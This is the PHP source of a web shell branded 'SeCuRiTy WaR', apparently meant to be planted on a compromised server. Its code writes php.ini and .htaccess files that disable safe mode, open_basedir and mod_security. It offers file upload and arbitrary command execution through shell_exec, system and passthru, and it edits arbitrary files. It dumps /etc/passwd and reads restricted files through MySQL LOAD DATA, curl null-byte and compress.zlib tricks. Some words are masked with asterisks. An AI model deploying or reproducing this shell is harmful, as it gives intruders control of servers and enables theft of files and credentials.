<html/>
<?php
echo "<right>";
echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
    <p align='center'>
    <INPUT type='submit' ****='FucK' value='Say To Safemode Go To HeLl By php.ini' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-*****: 1px'></p>
</form>
";
echo "<right/>";
if  (empty($_POST['FucK'] ) ) {
    }ELSE{
    $action = '?action=FucK';
echo "<html>
<br>
<head>
****** **********='pragma' content='no-cache'>
</head><****>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<b>Safe mode done ..</b>";
echo ("<br>")
?>
<?
$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
FucKFilterEngine Off
FucKFilterScanPOST Off
FucKFilterCheckURLEncoding Off
FucKFilterCheckUnicodeEncoding Off
</IfModule> 
");
echo "<b>mod_security done..............</b><br>";

    echo "</font></center></td></tr></table> ";

    exit;
    }


$footer = " <p align='center'><font color='#808000' size='4'><b>powered by alnjm33</b></font></p>
<p align='center'><font size='4' color='#808000'><b>sec-war.com </b></font></p>
";
#/s/e/c/-/w/a/r/./c/o/m/############
                             #######
$mysql_use = "yes"; //"no"   //##### /// &#1604;&#1604;&#1578;&#1582;&#1591;&#1609; &#1576;&#1583;&#1575;&#1604;&#1607; sql
$mhost = "";                 //#####
$muser = "";                  ######
$mpass = "";                     ###
$mdb = "";                    ######
#/s/e/c/-/w/a/r/./c/o/m/############
?>
<?php
echo "<html>
<p align='center'><b><font color='#008000' size='6'>&nbsp;<a href='http://sec-war.com/cc/index.php?'><font color='#008000'><span style='****-decoration: none'>By SeCuRiTy WaR</span></font></a>
</font></b></p>
<b>
<tr>
";
echo "<left>";
echo "<font color='#FF0000'>php is :</font>";
echo "<html><font color='#008000'> ";
echo phpversion(); 
echo "</font> <html/>";
echo "<br>";
echo "<font color='#FF0000'>u**** -a:</font>"; 
echo "<html><font color='#008000'> ";
echo (php_u****());
echo "</font> <html/>";
echo "<br>";
$mod = (ini_get ("safe_mode"));
if ($mod == 1)   {
echo "<font color='#FF0000'>safe mode is : <font color='#FF0000'>ON</font> (secure)</font>
 ";
} else {
echo "
<font color='#FF0000'> safe mode is: <font color='#008000'>OFF</font>
<font color='#008000'>(not secure)</font>";
}
echo "<br>";
echo "<font color='#FF0000'>disable functions ::: </font> ";
if(''==($badfunctions=@ini_get('disable_functions')))
{echo "<font color='008000'>no functions</font></b>";}
else
{echo "<font color=FF0000>$badfunctions</font></b>";}
$secwar = getcwd();
echo "<br/>";
echo "<b>dir :<font color='#008000'><font color='#008000'> $secwar</font>";
echo "<br>";
$server = gethostby****($_SERVER["HTTP_HOST"]);
echo "<b><font color='#FF0000'>server ip :<font color='#008000'> $server </font>";
echo "<left/>";
?>
<?php
$cwd = getcwd();
echo "    <center>
<form method='POST' enctype='multipart/form-data'>
<b>UPLOAD FILE</b><p>
<input type='file' ****='uploads' size='30' style='font-size: 10pt; color: #008000; font-family: Tahoma; border: 1px inset #C0C0C0; background-color: #FFFFFF; font-weight:bold'>
<br>
<input type='submit' value='Upload' size='50' style='font-size: 8pt; color: #000080; font-family: Tahoma; border: 1px dashed #FFFFFF; background-color: #FFFFFF; font-weight:bold'>
</p>
</form></center></td></tr>
</table><br>";
if (!empty ($_FILES['uploads']))
{
    move_uploaded_file($_FILES['uploads']['tmp_****'],$_FILES['uploads']['****']);
    echo "***************('Done :)'); </script><b>Uploaded !!!</b><br>**** : ".$_FILES['uploads']['****']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type'];
}

?>

<html>
<form action=<?php echo $url ?>?&<?php echo $word ?>&war method='post'>
<html/>
<?

echo "
<center>
<p align='center'><font color='#008000' size='5'><b>run cmd</b></font></p>
<input type='****' ****='command' size='46'><input type='submit' ****='sub' value='do it '>
<br>
<input type='radio' ****='cmmmd' value='4'>automatic
<input type='radio' ****='cmmmd' value='1'>shell_exec
<input type='radio' ****='cmmmd' value='3'>passthru
<input type='radio' ****='cmmmd' value='2'>system
<br>

<****area ****='exec' rows=6 cols=60 style='color: #008000; background-color: #000000; font-size:12pt; font-weight:bold'>

";

if (isset($_GET['war'])) {
    $dds=$_POST['cmmmd'];
      $com=$_POST['command'];
        if (isset($dds)) {
          if ($dds=="1") {
            echo shell_exec($com);
              }
               elseif($dds=="2") {
                 echo system($com); 
                   }
                  elseif ($dds=="3") {
                    passthru($com);
                     }
                       elseif ($dds=="4") {
                         if (function_exists(shell_exec)) {
                            echo shell_exec($com);
                              }
                                 elseif (function_exists(system)) {
                                   echo system($com);
                                     }
                                       elseif (function_exists(passthru)) {
                                         echo passthru($com);
                                           }
                                             else {
                                              echo "[-]Error";
                                             }    
                                          }
                                       }
                                    }
echo "</****area>";
?>
<?
echo "


<****>

<table border='1' *****='100%'>
    <tr>
        <td>&nbsp;<center>
    <b><font face='Comic Sans MS' size='2'>.:Edit File:.</font></b></p><font size=1 face='Verdana'>".stripslashes($file)."</font><br><form method=POST action=''>
    <input type=**** ****='editfile' value=$cwd ' size=25 ' style='font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1px solid #666666; background-color: #000000' size='46'><br><input type=submit ****='editgo' value='  Give me the file  ' style='font-size: 8pt; color: #00FF00; font-family: Tahoma; border: 1px dashed #FFFFFF; background-color: #000000'></form></center></td></tr>
</table>
<center/></td>
    </tr>
</table>

</****>

</html>
";
if (isset($_POST['editgo']) && $_POST['editfile'] !=$cwd)
{
$file = $_POST['editfile'];
$content = file_get_contents($file);
echo "<center><table border=0 *****='100%'>
<tr><td style='border:1px solid #00FF00; background-color: #000000'>
<form method=POST action=''><input type='hidden' ****='editfile' value='".$file."'><center><****area rows='19' cols='103' style='color: #00FF00; background-color: #000000' ****='new****'>".htmlspecialchars($content)."</****area><br><input type=submit ****='edit' value='Save' style='font-size: 9pt; color: #FFFFFF; font-family: Tahoma; border: 1px dashed #FFFFFF; background-color: #000000'></center></form>
</td></tr>
</table></center>";
}
if (isset($_POST['edit']))
{
$file = $_POST['editfile'];
$ch = fopen($file, "w+") or die("***************('Error Editing'); </script>");
fwrite($ch, stripslashes($_POST['new****'])) or die ("***************('Error'); </script>");
fclose($ch);
echo "***************('Done what about visit us sec-war.com');</script>";
}
echo "<br/>";
?>
<?

echo "
<table border='1' *****='100%' bordercolorlight='#FFFFFF' cellspacing='0' cellpadding='0' bordercolordark='#FFFFFF'>
    <tr>
        <td>&nbsp;    
<p align='center'><font color='#FFFF00'><b>
&#1579;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1594;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1585;&#1575;&#1578; &#1604;&#1602;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1585;&#1575;&#1600;&#1569;&#1607; 
&#1575;&#1604;&#1605;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1604;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1601;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1600;&#1575;&#1578;</b></font></p>

<title>SeCuRiTy WaR</title>
<center>
<font color='#FFFF00' size='4'>
<br>
<p align='center'>
<font face='Comic Sans MS' size='2'>ini_restore:</font>
<br/>
<input type=**** ****=inimode value=/etc/passwd size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #000000; background-color: #FFFFFFF' >
<br>
<input type=submit value='GO' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px dashed #FFFFFF; background-color: #FFFFFF'></form></td>
    </tr>
</table>

";


if(empty($_POST['inimode'])){
} else {
echo "Done.....","<br> ";
echo "<center><table border=0 *****='100%' bgcolor='#FFFFFF'>
<tr><td style='border:1px solid #FFFFFF; background-color: #FFFFFF'>
<center>
<****area rows='19' cols='103'  style='color: #008000; background-color: #000000'>";
$inimode=$_POST['inimode'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$m");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$inimode");
echo "</****area></center></td></tr></table></center>";
}

echo "<div align=center id='n'><font face=tahoma size=2><b>
<form style='border: 1px ridge #FFFFFF'>
<td *****='50%'><font color=red>Read etc/passwd</font></td>
<br>
    <td *****='50%'><select size=\'1\' ****='blue'><option value='SecurityWar'>/etc/passwd</option></option></select></td>

<td *****='100%' colspan='2'>
    <p align='center'><input type='submit' value='ok'></td>
    </form>
      <form style='border: 1px ridge #FFFFFF'>
      <****area rows='19' cols='103'  style='color: #008000; background-color: #000000'>
";


     if ($_GET['blue'] )

                                           for($uid=0;$uid<60000;$uid++){
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                        
echo "</****area></center></td></tr></table></center>";
?>

<?php
echo "
<table border='1' *****='100%' bordercolorlight='#FFFFFF' cellspacing='0' cellpadding='0' bordercolordark='#FFFFFF'>
    <tr>
        <td>
        <p align='center'>&nbsp;</form></p>
        <form method=POST action=''>
            <p align='center'><b>
    <font face='Comic Sans MS' size='2' color='#008000'>SQL :</font></b></p>
            <p align='center'>
    <font face='Comic Sans MS' size='2'>&nbsp;&nbsp;&nbsp;</font><input type=**** ****=sql value=/etc/passwd size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px inset #FFFFFF; background-color: #FFFFFF'></p>
    <p align='center'>
    &nbsp;<input type=submit value=GO style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px inset #000000; background-color: #FFFFFF'></p></td>
    </tr>
</table>

";
if(empty($_POST['sql'])){
} else {
echo "
<**** ****='#008000' bgcolor='#000000'>

<center><table border=0 *****='100%'>
<tr><td style='border:1px solid #008000; background-color: #000000'>
<center><****area rows='19' cols='103' method=POST style='color: #008000; background-color: #000000'>"
;
$sqlfile=$_POST['sql'];


$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

$sql = array (
"USE $mdb",
'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
"LOAD DATA LOCAL INFILE '$sqlfile' INTO TABLE $tbl FIELDS "
. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
. "ESCAPED BY          '' "
. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

"SELECT a FROM $tbl LIMIT 1"
);
mysql_connect ($mhost, $muser, $mpass);

                                foreach ($sql as $statement) {
                                   $q = mysql_query ($statement);

                                   if ($q == false) die (
                                      "FAILED: " . $statement . "\n" .
                                      "REASON: " . mysql_error () . "\n"
                                   );

                                   if (! $r = @mysql_fetch_array ($q, mysql_NUM)) continue;

                                   echo htmlspecialchars($r[0]);
                                   mysql_free_result ($q);
                                }
echo "</****area></center></td></tr></table></center>";
}
?>
<?
echo "



<table border='1' *****='100%'>
    <tr>
        <td>
</form><form method=POST action=''>
    <p align='center'><font face='Comic Sans MS' size='2'><b>
    <font color='#0000FF'>curl</font></b></font></p>
    <p align='center'><font face='Comic Sans MS' size='2'></font>
    <input type=**** ****=cur value=Ammmmmmmm size='50' style='font-size: 10pt; color: #008000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFF; font-weight:bold' ></p>
    <p align='center'>
    <input type=submit value='Read' style='font-size: 12pt; color: #008000; font-family: Tahoma; border: 1px inset #808080; background-color: #FFFFFF; font-weight:bold'></p>
</form>
";
if(empty($_POST['cur'])){

} else {
echo "Reading .....","<br>" ;
echo "<center><table border=0 *****='100%'>
<tr><td style='border:1px solid #FFFFFF; background-color: #000000'><center>
<****area rows='19' cols='103' style='color: #00FF00; background-color: #000000'>";

$m=$_POST['cur'];
$li =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($li);
var_dump(curl_exec($li));
echo "</****area></center></td></tr></table></center>";
}

// &#1605;&#1606;&#1602;&#1608;&#1604; &#1605;&#1606; very secret 
echo "<html>

<table border='1' *****='100%'>
    <tr>
        <td>

<form method='POST' enctype='multipart/form-data' >


<form method='POST' enctype='multipart/form-data' >

<p align='center'>

<font color='#808000'>

<br>
<b>show_source :</b></font></p>
<p align='center'>

<b>&nbsp;</b><input type='****' ****='source' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<center>

<center>

<font color='#808000'>

<b>highlight_file :</b></font><p><b>&nbsp;</b><input type='****' ****='high' value='' size='59' style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'></p>
<center>

<center>

<input type='submit''  value='Read'  style='color: #00FF00; border: 1px inset #000000; background-color: #FFFFFF; font-weight:bold'></form</p>
</form</p>
    </form>
    <p>&nbsp;</td>
</tr>
</table>


";
if(empty($_POST['source']))
{
}
else
{
$s = $_POST['source'];
echo "<b><h1><font size='4' color='silver'>show_source</font></h1>";
$source = show_source($s);
echo "</****area>";
}
if(empty($_POST['high']))
{
}
else
{
$h = $_POST['high'];
echo "<b><h1><font size='4' color='silver'>highlight_file</font></h1>";
echo "<br>";
$high = highlight_file($h);
}
?>
<?php
ECHO "
<table border='1' *****='100%'>
    <tr>
        <td>&nbsp;<center>
<form method=POST action=''>
    <p align=;center;><font face='Comic Sans MS' size='2'><font color='#FFFFCC'>
    <b>Copy :&nbsp;</b></font>&nbsp;&nbsp;&nbsp;&nbsp;</font></p>
    <p align='center'><font face='Comic Sans MS' size='2'>&nbsp;&nbsp;</font><input type=**** ****=copy value=/etc/passwd size='50' style='font-size: 10pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'></p>
    <p align='center'>
    <input type=submit value=Show style='font-size: 10pt; color: #00FF00; font-family: Tahoma; border: 1px dashed #FFFFFF; background-color: #FFFFFF
; font-weight:bold'></p>
<center/>
";
$mon="";
$tymczas="";
if(empty($_POST['copy'])){
} else {
echo "<p><b><font size='5' color='#FFFFCC'>Done.....</font></b></p>
" ;
"<br>";
echo "<****area method='POST' cols='80' rows='23' wrar='off' style='color: #008000' ****='a' >";
$mon=$_POST['copy'];
$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$mon, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</****area>";
echo "</td>
    </tr>
</table>";
} else {
die("<FONT COLOR=\"RED\"><CENTER><font color='#FF0000'><b>&#1607;&#1584;&#1575; &#1575;&#1604;&#1605;&#1604;&#1601; &#1610;&#1575;&#1605;&#1575; &#1594;&#1610;&#1585; &#1605;&#1608;&#1580;&#1608;&#1583; 
&#1610;&#1575;&#1605;&#1575; &#1604;&#1610;&#1587; &#1604;&#1583;&#1610;&#1603; &#1575;&#1604;&#1578;&#1589;&#1585;&#1610;&#1581;</b></font>
<B>&quot;".htmlspecialchars($mon)."&quot;</B> </CENTER></FONT>");
}
}
?>
    <html>
<center>
<a href=<?php echo $url; ?><?php echo $word ?>?team>
<input type=submit value='Security War Team' ****="chmod" style="border-style: ridge; border-*****: 1px"></a></p>
<center/>
<html/>
    <?


if (isset($_GET['team'])) {
echo "
<head>
****** **********='Content-********' content='en-us'>
</head>

<p align='center'><font color='#0000FF'><b>MeMaTi</b></font></p>
<p align='center'><font color='#0000FF'><b>PrEdAtOr</b></font></p>
<p align='center'><font color='#0000FF'><b>AlNjM33</b></font></p>
<p align='center'><font color='#0000FF'><b>mrlala</b></font></p>
<p align='center'><font color='#0000FF'><b>xXx</b></font></p>
<p align='center'><font color='#0000FF'><b><span lang='ar-eg'>&#1575;&#1604;&#1588;&#1576;&#1581; &#1575;&#1604;&#1605;&#1585;&#1581;</span></b></font></p>
<p align='center'><font color='#0000FF'><b>DON-CaRloS</b></font></p>
<p align='center'><font color='#0000FF'><b><span class='lastaction'><span lang='ar-eg'>&#1605;&#1580;&#1606;&#1608;&#1606; &#1580;&#1606;&#1575;&#1606;</span></span></b></font></p>
<p align='center'><font color='#0000FF'><span class='lastaction'><span lang='ar-eg'><b>&#1580;&#1605;&#1610;&#1593; &#1575;&#1604;&#1602;&#1575;&#1574;&#1605;&#1610;&#1606; 
&#1593;&#1604;&#1609; &#1605;&#1608;&#1602;&#1593; &#1587;&#1610;&#1603;&#1610;&#1608;&#1585;&#1578;&#1609; &#1608;&#1575;&#1585;</b></span></span></font></p>
";
exit;

}

?>